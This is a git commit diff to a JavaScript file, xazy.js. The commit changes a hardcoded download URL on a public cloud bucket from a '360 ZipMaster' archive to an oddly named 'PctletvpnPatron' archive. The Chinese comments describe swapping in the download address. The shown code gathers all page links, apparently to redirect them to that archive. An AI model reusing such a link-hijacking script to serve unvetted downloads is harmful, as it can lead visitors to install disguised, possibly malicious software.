08d1dc666b69845d89f1ad4407342b7a483d7c76
lm168188 <gnato973@gmail.com>
2025-05-06 18:47:20 +0800

    Update xazy.js

--- xazy.js
+++ xazy.js
@@ -1,7 +1,7 @@
-var xz ="download.html?file=https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/360_ZipMaster_x64_v1.7.6.zip";
+var xz ="https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/GTD_XP-Win11_PctletvpnPatron_v51611.133.zip";
 
-//可以把   https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/360_ZipMaster_x64_v1.7.6.zip  这个改成下载地址；https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/360_ZipMaster_x64_v1.7.6.zip
-//可以把   https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/360_ZipMaster_x64_v1.7.6.zip  这个改成文件下载：https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/360_ZipMaster_x64_v1.7.6.zip
+//可以把   https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/GTD_XP-Win11_PctletvpnPatron_v51611.133.zip  这个改成下载地址；https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/GTD_XP-Win11_PctletvpnPatron_v51611.133.zip
+//可以把   https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/GTD_XP-Win11_PctletvpnPatron_v51611.133.zip  这个改成文件下载：https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/GTD_XP-Win11_PctletvpnPatron_v51611.133.zip
 
 
 var links = document.getElementsByTagName("a");
